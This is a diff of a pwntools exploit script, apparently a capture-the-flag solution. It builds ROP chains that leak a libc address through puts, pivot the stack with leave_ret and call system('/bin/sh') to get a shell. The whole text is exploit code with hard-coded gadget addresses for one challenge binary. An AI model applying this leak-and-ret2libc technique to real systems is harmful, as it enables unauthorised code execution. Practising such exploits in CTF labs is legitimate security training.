@@ -17,18 +17,39 @@ pop_rdi = 0x400743
 pop_rbp = 0x4005a0
 leave_ret = 0x4006d1
 
+
 p = flat(
+    'D' * 0xe0,
     pop_rdi,
     e.got['__libc_start_main'],
     e.plt['puts'],
-    pop_rbp,
-    name + 0x200,
-    0x400693
+    main
 )
 
-print hex(e.plt['puts']) , hex(e.got['__libc_start_main']) , len(p)
+y.sendafter( '?' , p )
+
+p = flat(
+    'D' * 0x20,
+    name + 0xe0 - 8,
+    leave_ret
+)
 
 y.sendafter( '?' , p )
+
+y.recvline()
+y.recvline()
+y.recvline()
+
+l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
+log.success('libc -> {}'.format( hex(l.address) ))
+
+p = flat(
+    pop_rdi,
+    l.search( '/bin/sh\x00' ).next(),
+    l.symbols['system']
+)
+
+#y.sendafter( '?' , p )
 
 p = flat(
     'D' * 0x20,
@@ -36,9 +57,7 @@ p = flat(
     leave_ret
 )
 
-y.sendafter( '?' , p )
-
-
+#y.sendafter( '?' , p )
 
 #y.sendline( 'cat /home/`whoami`/flag' )
 
